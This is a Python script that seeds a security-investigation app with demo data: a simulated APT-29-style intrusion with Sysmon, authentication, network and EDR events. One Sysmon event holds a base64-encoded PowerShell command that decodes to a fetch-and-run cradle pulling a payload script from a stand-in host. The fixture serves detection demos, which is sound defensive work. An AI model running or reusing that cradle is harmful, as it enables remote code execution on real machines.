import asyncio
from datetime import datetime, timezone, timedelta
import logging
import uuid
from sqlalchemy import text

from app.core.database import AsyncSessionLocal, init_neo4j, close_neo4j, get_neo4j_driver
from app.repositories.investigation_repository import InvestigationRepository
from app.models.investigation import InvestigationModel
from app.services.ingestion import IngestionService
from app.adapters import register_default_adapters

logger = logging.getLogger(__name__)

DEMO_USERS = ["analyst@tracegraph.io", "pramit.0904@gmail.com", "dev_user"]

async def seed_if_empty(force: bool = False) -> bool:
    """Seed initial demo data if no investigations currently exist in the database."""
    register_default_adapters()
    driver = await get_neo4j_driver()

    async with AsyncSessionLocal() as session:
        if not force:
            result = await session.execute(text("SELECT COUNT(*) FROM investigations;"))
            count = result.scalar() or 0
            if count > 0:
                logger.info("Database already contains %d investigations. Skipping automatic seed.", count)
                return False

        logger.info("Database is empty. Automatically seeding initial demo security investigations...")
        inv_repo = InvestigationRepository(session)
        
        for owner in DEMO_USERS:
            inv_id = str(uuid.uuid4())
            inv = InvestigationModel(
                investigation_id=uuid.UUID(inv_id),
                title="APT-29 Lateral Movement & Privilege Escalation",
                description="Detected suspicious PowerShell commands, LSASS memory dumping, and SMB lateral movement from WS-FIN-01 to DC-01.",
                status="OPEN",
                outcome=None,
                owner_id=owner,
                event_count=0
            )
            session.add(inv)
            await session.commit()

            ingestion_svc = IngestionService(db=session, neo4j_driver=driver)
            now = datetime.now(timezone.utc)

            # 1. Sysmon Events
            sysmon_events = [
                {
                    "event_id": str(uuid.uuid4()),
                    "Computer": "WS-FIN-01",
                    "User": "FINANCE\\jsmith",
                    "EventID": "1",
                    "UtcTime": (now - timedelta(minutes=45)).isoformat(),
                    "Image": "C:\\Windows\\System32\\cmd.exe",
                    "CommandLine": "cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\\Users\\jsmith\\AppData\\Local\\Temp\\update.ps1",
                    "ProcessId": "4102",
                    "ParentImage": "C:\\Windows\\explorer.exe"
                },
                {
                    "event_id": str(uuid.uuid4()),
                    "Computer": "WS-FIN-01",
                    "User": "FINANCE\\jsmith",
                    "EventID": "1",
                    "UtcTime": (now - timedelta(minutes=40)).isoformat(),
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
                    "ProcessId": "5812",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
                },
                {
                    "event_id": str(uuid.uuid4()),
                    "Computer": "WS-FIN-01",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "EventID": "11",
                    "UtcTime": (now - timedelta(minutes=35)).isoformat(),
                    "TargetFilename": "C:\\Windows\\Temp\\lsass_dump.dmp",
                    "Image": "C:\\Tools\\rundll32.exe"
                },
            ]
            r1 = await ingestion_svc.process_event_batch(raw_events=sysmon_events, investigation_id=inv_id, source_type="sysmon")

            # 2. Auth Events
            auth_events = [
                {
                    "event_id": str(uuid.uuid4()),
                    "workstation": "192.168.1.45",
                    "username": "jsmith",
                    "target_host": "WS-FIN-01",
                    "timestamp": (now - timedelta(minutes=50)).isoformat(),
                    "action": "success",
                    "auth_event": "Kerberos Authentication"
                },
                {
                    "event_id": str(uuid.uuid4()),
                    "source_host": "WS-FIN-01",
                    "username": "Administrator",
                    "target_host": "DC-01",
                    "timestamp": (now - timedelta(minutes=25)).isoformat(),
                    "action": "success",
                    "auth_event": "NTLM Authentication"
                },
                {
                    "event_id": str(uuid.uuid4()),
                    "source_host": "WS-FIN-01",
                    "username": "svc_backup",
                    "target_host": "FILE-SERVER-02",
                    "timestamp": (now - timedelta(minutes=15)).isoformat(),
                    "action": "success",
                    "auth_event": "Kerberos Authentication"
                }
            ]
            r2 = await ingestion_svc.process_event_batch(raw_events=auth_events, investigation_id=inv_id, source_type="auth")

            # 3. Network Events
            network_events = [
                {
                    "event_id": str(uuid.uuid4()),
                    "src_ip": "192.168.1.45",
                    "dest_ip": "198.51.100.77",
                    "source_host": "WS-FIN-01",
                    "destination_host": "c2.malicious-domain.com",
                    "dest_port": 443,
                    "protocol": "HTTPS",
                    "bytes_sent": 4820,
                    "bytes_received": 124500,
                    "timestamp": (now - timedelta(minutes=30)).isoformat()
                },
                {
                    "event_id": str(uuid.uuid4()),
                    "src_ip": "192.168.1.45",
                    "dest_ip": "192.168.1.10",
                    "source_host": "WS-FIN-01",
                    "destination_host": "DC-01",
                    "dest_port": 445,
                    "protocol": "SMB",
                    "bytes_sent": 84200,
                    "bytes_received": 12300,
                    "timestamp": (now - timedelta(minutes=20)).isoformat()
                }
            ]
            r3 = await ingestion_svc.process_event_batch(raw_events=network_events, investigation_id=inv_id, source_type="network")

            # 4. EDR Events
            edr_events = [
                {
                    "event_id": str(uuid.uuid4()),
                    "hostname": "WS-FIN-01",
                    "target_host": "DC-01",
                    "timestamp": (now - timedelta(minutes=10)).isoformat(),
                    "event_type": "T1003.001 - OS Credential Dumping: LSASS Memory",
                    "severity": "CRITICAL",
                    "action": "lsass process memory read attempt detected",
                    "process": "C:\\Tools\\rundll32.exe"
                },
                {
                    "event_id": str(uuid.uuid4()),
                    "hostname": "WS-FIN-01",
                    "target_host": "FILE-SERVER-02",
                    "timestamp": (now - timedelta(minutes=5)).isoformat(),
                    "event_type": "T1021.002 - Remote Services: SMB/Windows Admin Shares",
                    "severity": "HIGH",
                    "action": "Remote administrative share C$ access detected",
                    "process": "C:\\Windows\\System32\\cmd.exe"
                }
            ]
            r4 = await ingestion_svc.process_event_batch(raw_events=edr_events, investigation_id=inv_id, source_type="edr")

            # Update final event count
            total_events = r1.accepted + r2.accepted + r3.accepted + r4.accepted
            row = await inv_repo.get_by_id(inv_id)
            if row:
                row.event_count = total_events
                await session.commit()

        logger.info("Successfully seeded demo data for %d users.", len(DEMO_USERS))
        return True

async def main():
    await init_neo4j()
    await seed_if_empty(force=True)
    await close_neo4j()

if __name__ == "__main__":
    asyncio.run(main())
